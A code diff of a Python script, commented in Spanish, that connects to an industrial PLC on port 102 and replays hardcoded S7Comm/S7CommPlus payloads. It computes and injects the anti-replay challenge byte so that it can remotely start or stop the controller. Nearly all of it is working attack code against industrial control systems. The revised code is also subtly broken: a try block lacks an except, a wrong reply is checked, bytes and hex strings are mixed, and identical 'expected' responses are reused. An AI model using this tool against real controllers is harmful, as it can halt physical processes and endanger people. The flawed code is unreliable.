@@ -23,69 +23,143 @@ import sys
 import io
 import re
 
+
+def fDeterminarSiIPoFQDN(pHost):
+  # Expresión regular para validar una dirección IP
+  vIPRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
+  # Expresión regular para validar un FQDN
+  vFQDNRegex = r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$"
+  if re.match(vIPRegex, pHost) or re.match(vFQDNRegex, pHost):
+    return True
+  return False
+
+
 def fCalcValorAntiReplay(pPayloadDeRespSolS7Comm):
   vChallenge = pPayloadDeRespSolS7Comm.hex()[48:50]
   vAntiReplay = int(vChallenge, 16) + int("80", 16)
   return vAntiReplay
 
+def fInyectarAntiReplayEnPayload(pPayload):
+  vPayloadAInyectar = pPayload
+  vChallenge = vPayloadAInyectar.hex()[48:50]       # Extraer el challenge
+  vAntiReplay = int(vChallenge, 16) + int("80", 16) # Calcular el valor del anti-replay
+  vAntiReplayHex = f"{vAntiReplay:02x}"             # Convertir el valor vAntiReplay en un string de 2 caracteres hex con relleno cero
+  # Preparar payload
+  vPayloadAInyectar = vPayloadAInyectar[:46] + hex(vAntiReplay)[2] + vPayloadAInyectar[47:]
+  vPayloadAInyectar = vPayloadAInyectar[:47] + hex(vAntiReplay)[3] + vPayloadAInyectar[48:]
+  print(f"vPayloadAInyectar")
+  return vPayloadAInyectar
+
 def fEncApPLC(pHostPLC, pAction):
   # Definir payload para solicitar la comunicación COPT. Longitud: 89
-  vPayloadSolComCOTP  = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  vRespSolComCOTP    = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
   # Payload para solicitar la comunicación S7Comm. Longitud: 292
-  vPayloadSolComS7    = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
-  # Payload para el anti-replay. Longitud: 197
-  vPayloadAntiReplay  = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  vPayloadSolComS7          = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vRespSolComS7ConChallenge = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  # Payload con el chalelenge del el anti-replay resuelto. Longitud: 197
+  vPayloadConAntiReplayResuelto = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  vRespAntiReplayResuelto       = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
   # Payload par enviar la orden de encendido del PLC. Longitud: 121
   vPayloadEncenderPLC = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
+  vRespEncenderPLC    = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
   # Payload par enviar la orden de apagado del PLC. Longitud: 121
-  vPayloadApagarPLC   = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+  vPayloadApagarPLC = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+  vRespApagarPLC    = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
 
-  # Iniciar socket
-  vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  vSocketConPLC.connect((pHostPLC, 102))
-  # Enviar payload de solicitud de comunicacion COTP
-  vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
-  vPayloadDeRespSolComCOTP = vSocketConPLC.recv(1024)
-  # Enviar payload de solicitud de comunicación S7Comm
-  vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
-  vPayloadDeRespSolComS7 = vSocketConPLC.recv(1024)
-  # Calcular el valor anti-replay
-  vAntiReplay = fCalcValorAntiReplay(vPayloadDeRespSolComS7)
-  if pAction == "Encender":
-    print(f"Enviando payload de encendido del PLC")
-    #
-    vPayloadAntiReplay  = vPayloadAntiReplay[:46]  + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
-    vPayloadAntiReplay  = vPayloadAntiReplay[:47]  + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
-    vPayloadEncenderPLC = vPayloadEncenderPLC[:46] + hex(vAntiReplay)[2] + vPayloadEncenderPLC[47:]
-    vPayloadEncenderPLC = vPayloadEncenderPLC[:47] + hex(vAntiReplay)[3] + vPayloadEncenderPLC[48:]
-    # Enviar payload de encendido
-    vSocketConPLC.send(bytearray.fromhex(vPayloadEncenderPLC))
-    vPayloadDeRespEncendido = vSocketConPLC.recv(1024)
-    # Cerrar el socket
-    vSocketConPLC.close()
-  elif pAction == "Apagar":
-    print(f"Enviando payload de apagado del PLC")
-    #
-    vPayloadAntiReplay = vPayloadAntiReplay[:46] + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
-    vPayloadAntiReplay = vPayloadAntiReplay[:47] + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
-    vPayloadApagarPLC  = vPayloadApagarPLC[:46]  + hex(vAntiReplay)[2] + vPayloadApagarPLC[47:]
-    vPayloadApagarPLC  = vPayloadApagarPLC[:47]  + hex(vAntiReplay)[3] + vPayloadApagarPLC[48:]
-    # Enviar payload de apagado
-    vSocketConPLC.send(bytearray.fromhex(vPayloadApagarPLC))
-    vPayloadDeRespApagado = vSocketConPLC.recv(1024)
-    # Cerrar el socket
-    vSocketConPLC.close()
-  else:
-    print(f"No ha quedado claro si lo que se quiere es encender o apagar el PLC.")
-    vSocketConPLC.close()
+  try:
 
+    # Iniciar socket
+    vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    vSocketConPLC.settimeout(2)
+    vSocketConPLC.connect((pHostPLC, 102))
 
-def fModPayloadS7Comm(pPayloadAModificar, pValorAntiReplay):
-  vAntiReplay = fCalcValorAntiReplay(pPayloadDeRespSolS7Comm)
-  vPayloadAntiReplay  = vPayloadAntiReplay[:46]  + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
-  vPayloadAntiReplay  = vPayloadAntiReplay[:47]  + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
-  vPayloadFinal = pPayloadAModificar[:46] + hex(vAntiReplay)[2] + pPayloadAModificar[47:]
-  vPayloadFinal = vPayloadEncenderPLC[:47] + hex(vAntiReplay)[3] + vPayloadEncenderPLC[48:]
+    # 1. Enviar payload de solicitud de comunicacion COTP
+    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
+    print(f"Solicitud: {vPayloadSolComCOTP}")
+    vResp = vSocketConPLC.recv(1024)
+    if not vResp:
+      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
+      vSocketConPLC.close()
+      return
+    vRespuestaHEX = vResp.hex()
+    print(f"Respuesta: {vRespuestaHEX}")
+    # Verificar que la respuesta sea la esperada
+    if vRespuestaHEX != vRespSolComS7ConChallenge:
+      print(f"La respuesta a {vPayloadSolComCOTP} no es la esperada. Abortando...")
+      vSocketConPLC.close()
+      return
+
+    # 2. Enviar payload de solicitud de comunicación S7CommPlus
+    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
+    print(f"Solicitud: {vPayloadSolComS7}")
+    vResp = vSocketConPLC.recv(1024)
+    if not vResp:
+      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
+      vSocketConPLC.close()
+      return
+    vRespuestaHEX = vResp.hex()
+    print(f"Respuesta: {vRespuestaHEX}")
+    # Verificar que la respuesta sea la esperada
+    if vRespuestaHEX != vRespSolComS7ConChallenge:
+      print(f"La respuesta a {vPayloadSolComS7} no es la esperada. Abortando.")
+      vSocketConPLC.close()
+      return
+
+    # 3. Enviar payload con respuesta al challenge anti-replay
+    vPayloadConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vRespuestaHEX))
+    vSocketConPLC.send(bytearray.fromhex(vPayloadConAntiReplay))
+    print(f"Solicitud: {vPayloadConAntiReplay}")
+    vResp = vSocketConPLC.recv(1024)
+    if not vResp:
+      print(f"No se recibió respuesta al enviar {vPayloadConAntiReplay}")
+      vSocketConPLC.close()
+      return
+    vRespuestaHEX = vResp.hex()
+    print(f"Respuesta: {vRespuestaHEX}")
+    # Verificar que la respuesta sea la esperada
+    if vRespuestaHEX != vRespAntiReplayResuelto:
+      print(f"La respuesta a {vPayloadConAntiReplay} no es la esperada. Abortando.")
+      vSocketConPLC.close()
+      return
+
+    # 4. Enviar payload con orden de encendido o apagado
+    if pAction == "Encender":
+      vPayloadEncenderConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vPayloadEncenderPLC))
+      vSocketConPLC.send(bytearray.fromhex(vPayloadEncenderConAntiReplay))
+      print(f"Solicitud: {vPayloadEncenderConAntiReplay}")
+      vResp = vSocketConPLC.recv(1024)
+      if not vResp:
+        print(f"No se recibió respuesta al enviar {vPayloadEncenderConAntiReplay}")
+        vSocketConPLC.close()
+        return
+      vRespuestaHEX = vResp.hex()
+      print(f"Respuesta: {vRespuestaHEX}")
+      # Verificar que la respuesta sea la esperada
+      if vRespuestaHEX != vRespEncenderPLC:
+        print(f"La respuesta a {vPayloadEncenderConAntiReplay} no es la esperada. Abortando.")
+        vSocketConPLC.close()
+        return
+    elif pAction == "Apagar":
+      vPayloadApagarConAntiReplay = fInyectarAntiReplayEnPayload(bytearray.fromhex(vPayloadApagarPLC))
+      vSocketConPLC.send(bytearray.fromhex(vPayloadApagarConAntiReplay))
+      print(f"Solicitud: {vPayloadApagarConAntiReplay}")
+      vResp = vSocketConPLC.recv(1024)
+      if not vResp:
+        print(f"No se recibió respuesta al enviar {vPayloadApagarConAntiReplay}")
+        vSocketConPLC.close()
+        return
+      vRespuestaHEX = vResp.hex()
+      print(f"Respuesta: {vRespuestaHEX}")
+      # Verificar que la respuesta sea la esperada
+      if vRespuestaHEX != vRespApagarPLC:
+        print(f"La respuesta a {vPayloadApagarConAntiReplay} no es la esperada. Abortando.")
+        vSocketConPLC.close()
+        return
+    else:
+      print(f"No ha quedado claro si lo que se quiere es encender o apagar el PLC.")
+      vSocketConPLC.close()
+
 
 
 def fEncenderPLC(pHost):
@@ -106,6 +180,7 @@ def fEncenderPLC(pHost):
   vPayloadResp = enviar(vPayloadEncenderPLC, vSocketConPLC)
   print("Encendiendo el PLC...")
   vSocketConPLC.close()
+
 
 def fApagarPLC(pHost):
   vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a' # Lenght 89
